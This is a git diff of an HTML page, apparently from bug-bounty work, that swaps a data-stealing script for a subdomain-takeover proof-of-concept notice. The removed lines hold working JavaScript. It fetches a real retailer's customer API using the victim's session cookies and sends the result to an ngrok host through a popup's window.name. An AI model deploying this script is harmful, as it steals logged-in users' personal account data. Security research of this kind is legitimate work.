@@ -1,28 +1,6 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>Redirecionando...</title>
-</head>
 <body>
-  <script>
-    (async () => {
-      try {
-        const res = await fetch("https://www.boozt.com/at/de-at/api/customer", {
-          credentials: "include"
-        });
-        const data = await res.text();
-
-        const popup = window.open("https://47c6-2804-4580-1080-7db-63ef-d83d-eb52-42cc.ngrok-free.app/save", "_blank");
-        popup.name = data;
-
-        setTimeout(() => {
-          window.close();
-        }, 1000);
-      } catch (err) {
-        console.error("❌ Erro na coleta de dados:", err);
-        document.body.innerText = "Erro ao coletar dados da Boozt.";
-      }
-    })();
-  </script>
+<h1>Subdomain Takeover PoC - Hugo22dr</h1>
+<p>Controlled by hugo22dr@bugcrowdninja.com</p>
 </body>
 </html>
